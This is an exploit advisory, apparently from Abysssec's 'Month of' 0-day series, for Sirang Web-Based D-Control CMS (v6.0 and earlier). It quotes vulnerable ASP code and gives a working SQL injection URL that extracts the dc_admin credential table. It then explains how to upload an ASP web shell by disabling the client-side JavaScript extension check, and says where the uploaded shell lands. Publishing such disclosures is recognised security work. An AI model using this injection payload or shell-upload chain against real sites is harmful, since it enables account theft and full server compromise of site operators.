@@ -1,0 +1,85 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ <  Day 8 (0 day)
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+'''
+
+- Title  : Sirang Web-Based D-Control Multiple Remote Vulnerabilities 
+- Affected Version : <= v6.0
+- Vendor  Site   : http://www.sirang.com 
+
+- Discovery : Abysssec.com
+
+
+
+Description : 
+
+this CMS suffer from OWASP top 10 !!!
+some of there will come here ...
+
+Vulnerabilites : 
+======================================================================================================================
+1- SQL Injection
+
+Vulnerability is located in content.asp
+
+line 131-133
+...
+    txt="select * from news where del='false' and "+keyfld+"!='-' order by id desc limit 1"
+    set rs=conn.execute(txt)
+	while not rs.eof
+...
+
+content.asp line 202-206
+...
+if id<>"" then
+                    txt10 ="select * from "+ cstr(tblname) +" where del='false' and id='"+ id +"'"
+                    set xx = conn.execute(txt10)
+                    if not xx.eof then
+...             
+
+lots of files those will have to do input validation from user input are vulnerable to SQL Injection .
+
+PoC : 
+www.site.com/main_fa.asp?status=news&newsID=23'/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16/**/from/**/dc_admin/*
+note : if you can't see result you need to do it blindly 
+
+
+======================================================================================================================
+2- Bypass uploads restriction:
+
+after you got user/pass with sql injection go to
+http://site.com/admin/dc_upload.asp
+
+js file line 13-34 :
+
+
+function showthumb(file) {
+	if (file !='') {
+	myshowfile = file;
+	
+	extArray = new Array(".gif", ".jpg", ".png", ".bmp", ".jpe");
+	allowSubmit = false;
+	while (file.indexOf("\\") != -1)
+	file = file.slice(file.indexOf("\\") + 1);
+	ext = file.slice(file.indexOf(".")).toLowerCase();
+	for (var i = 0; i < extArray.length; i++) {
+	if (extArray[i] == ext) { allowSubmit = true; break; }
+	}
+	
+	if (allowSubmit) thumb.src=myshowfile;
+	else
+	alert("Only files that end in types:  " + (extArray.join("  ")) + " could be previewd.");
+	}
+	else {
+	alert("Only files that end in types:  " + (extArray.join("  ")) + " could be previewd.");
+	}
+}
+ 
+as you can see the uploader will check malicious extention by javascript . just disable javascript and you can upload "ASP" shell. 
+
+you can find your shell in : www.site.com/0_site_com/[rnd-number].asp (the application itself will show you right rnd number after upload)
